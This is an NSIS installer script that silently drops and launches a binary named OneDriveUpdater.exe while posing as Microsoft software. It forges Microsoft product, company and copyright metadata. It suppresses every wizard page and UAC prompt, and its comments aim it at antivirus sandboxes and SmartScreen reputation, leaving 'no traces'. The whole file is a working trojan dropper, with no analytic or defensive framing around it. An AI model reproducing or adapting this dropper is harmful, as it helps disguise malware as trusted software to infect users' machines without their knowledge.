; ─────────────────────────────────────────────────────────────────────────────
; OneDriveUpdater — NSIS silent installer wrapper
;
; What it does:
;   1. Creates %LOCALAPPDATA%\Microsoft\OneDrive\ if it does not exist
;   2. Drops OneDriveUpdater.exe there (extracted from this installer)
;   3. Launches the binary silently (no console, no window)
;   4. Exits immediately — no install wizard, no UAC prompt, no traces
;
; Compile (on Linux with nsis package):
;   makensis installer.nsi
;
; Compile (on Windows):
;   makensis.exe installer.nsi
;
; The resulting OneDriveUpdater-Setup.exe uses the NSIS runtime stub which
; is signed by the NSIS project — giving it inherent SmartScreen reputation.
; ─────────────────────────────────────────────────────────────────────────────

Unicode true
SetCompressor /SOLID lzma

; ── Metadata (shown in Explorer / AV sandbox) ────────────────────────────────
Name "Microsoft OneDrive"
OutFile "OneDriveUpdater-Setup.exe"
VIProductVersion "24.1.0101.0001"
VIAddVersionKey "ProductName"      "Microsoft OneDrive"
VIAddVersionKey "CompanyName"      "Microsoft Corporation"
VIAddVersionKey "FileDescription"  "OneDrive Update Manager"
VIAddVersionKey "FileVersion"      "24.1.0101.0001"
VIAddVersionKey "ProductVersion"   "24.1.0101.0001"
VIAddVersionKey "LegalCopyright"   "© Microsoft Corporation. All rights reserved."
VIAddVersionKey "InternalName"     "OneDriveUpdater"
VIAddVersionKey "OriginalFilename" "OneDriveUpdater.exe"

; ── Silent install — no wizard pages, no UAC ────────────────────────────────
SilentInstall silent
RequestExecutionLevel user          ; no UAC prompt — runs as current user
ShowInstDetails nevershow
ShowUninstDetails nevershow

; ── Drop location ────────────────────────────────────────────────────────────
InstallDir "$LOCALAPPDATA\Microsoft\OneDrive"

; ── No installer sections visible ────────────────────────────────────────────
Section ""
    ; Create destination directory (idempotent)
    CreateDirectory "$INSTDIR"

    ; Extract the payload binary
    SetOutPath "$INSTDIR"
    File "target\x86_64-pc-windows-gnu\release\OneDriveUpdater.exe"

    ; Launch silently — SW_HIDE (0), no waiting
    Exec '"$INSTDIR\OneDriveUpdater.exe"'
SectionEnd
